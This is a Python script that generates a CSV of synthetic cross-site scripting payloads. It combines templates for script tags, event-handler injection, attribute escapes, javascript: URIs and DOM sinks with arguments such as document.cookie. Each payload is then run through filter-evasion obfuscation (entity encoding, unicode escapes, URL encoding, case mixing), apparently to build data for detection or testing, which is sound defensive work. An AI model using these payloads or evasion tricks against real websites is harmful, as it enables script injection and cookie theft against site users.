import csv
import os
import itertools

TEMPLATES = {
    "script_injection": [
        '<script>{func}({arg})</script>',
        '<script>/{comment}/{func}({arg})</script>',
        '<script>{func}`{arg}`</script>',
    ],
    "tag_injection": [
        '<{tag} {event}={func}({arg})>',
        '<{tag} {event}={func}({arg})/>',
        '"><{tag} {event}={func}({arg})>',
    ],
    "attribute_escape": [
        '" {event}={func}({arg}) "',
        "' {event}={func}({arg}) '",
        '" onfocus={func}({arg}) autofocus="',
    ],
    "js_uri": [
        'javascript:{func}({arg})',
        'javascript:void({func}({arg}))',
        'j&#97;vascript:{func}({arg})',
    ],
    "dom_sink": [
        'document.write("<img src=x onerror={func}({arg})>")',
        'eval("{func}({arg})")',
        'setTimeout("{func}({arg})",0)',
    ],
}

TAGS = ["svg", "img", "body", "iframe", "details", "marquee", "video", "input", "a", "div", "select", "object"]
EVENTS = ["onload", "onerror", "onfocus", "onmouseover", "onclick", "onmouseenter", "ontoggle", "onbegin"]
FUNCS = ["alert", "prompt", "confirm", "console.log"]
ARGS = ["1", "'XSS'", "document.domain", "document.cookie", "String.fromCharCode(88,83,83)", "location.hash"]
COMMENTS = ["", "*", "x"]

def obfuscate(payload):
    v = [payload]
    v.append(payload.replace("a", "&#97;").replace("e", "&#101;"))
    v.append(payload.replace("alert", "\\u0061lert"))
    v.append(payload.replace("<", "%3C").replace(">", "%3E"))
    v.append(payload.replace("'", "%27").replace('"', "%22"))
    if "script" in payload.lower():
        v.append(payload.replace("script", "scr\tipt"))
    case_var = ""
    for i, c in enumerate(payload):
        case_var += c.upper() if c.isalpha() and i % 3 == 0 else c
    v.append(case_var)
    return v

generated = set()

for context, templates in TEMPLATES.items():
    for template in templates:
        for combo in itertools.islice(itertools.product(TAGS, EVENTS, FUNCS, ARGS, COMMENTS), 600):
            tag, event, func, arg, comment = combo
            try:
                payload = template.format(tag=tag, event=event, func=func, arg=arg, comment=comment, content="")
                for variant in obfuscate(payload):
                    if 5 < len(variant) < 2000:
                        generated.add((variant, context))
            except (KeyError, IndexError):
                continue

os.makedirs("processed", exist_ok=True)
with open("processed/synthetic_payloads.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["payload", "context"])
    for payload, context in generated:
        writer.writerow([payload, context])

print(f"[DONE] Generated {len(generated)} synthetic payloads -> processed/synthetic_payloads.csv")
